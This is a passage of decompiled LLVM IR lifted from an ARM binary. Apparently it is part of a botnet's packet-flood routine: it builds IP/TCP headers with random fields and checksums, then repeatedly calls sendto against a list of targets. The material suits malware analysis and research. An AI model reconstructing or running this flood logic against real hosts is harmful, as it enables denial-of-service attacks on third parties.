  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v5_a544 = call i32 @llvm.bswap.i32(i32 %v3_a528)
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp103 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp103 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp78, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4f0, %bb79
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp104 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp104 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp83, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, 65535
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp86, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp87 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp88, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp105
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v5_a520, { 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
